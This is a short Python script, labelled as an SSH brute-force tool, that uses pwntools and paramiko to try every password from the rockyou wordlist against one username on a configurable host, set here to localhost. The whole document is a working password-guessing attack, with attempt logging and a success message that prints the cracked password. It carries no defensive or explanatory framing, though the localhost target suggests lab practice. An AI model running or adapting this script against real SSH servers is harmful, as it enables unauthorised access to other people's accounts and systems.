'''
SSH Brute Force Script

Carlos Enamorado
'''


import paramiko
import sys
from pwn import *


#Your Target Host Machine
host = "127.0.0.1"
username = "f4th3rl0s"
attempts = 0

try:
	with open("/usr/share/wordlists/rockyou.txt", "r") as password_list:
		for password in password_list:
			password = password.strip("\n")
			try:
				print("[{}] Attempting password: '{}'!".format(attempts, password))
				response = ssh(host=host, user=username, password=password, timeout=1)
				if response.connected():
					print("[>] Successful Authentication! Password Found: {}".format(password))
					response.close()
					break
				response.close()
			except paramiko.ssh_exception.AuthenticationException:
				print("[X] Invalid Password!")
			attempts += 1

#Clean Keyboard Interrupt: ^C; must be outside of 'with' block
except KeyboardInterrupt:
	print("\n[-_-] Keyboard Interrupt: Exiting... [-_-]")
	sys.exit(0)
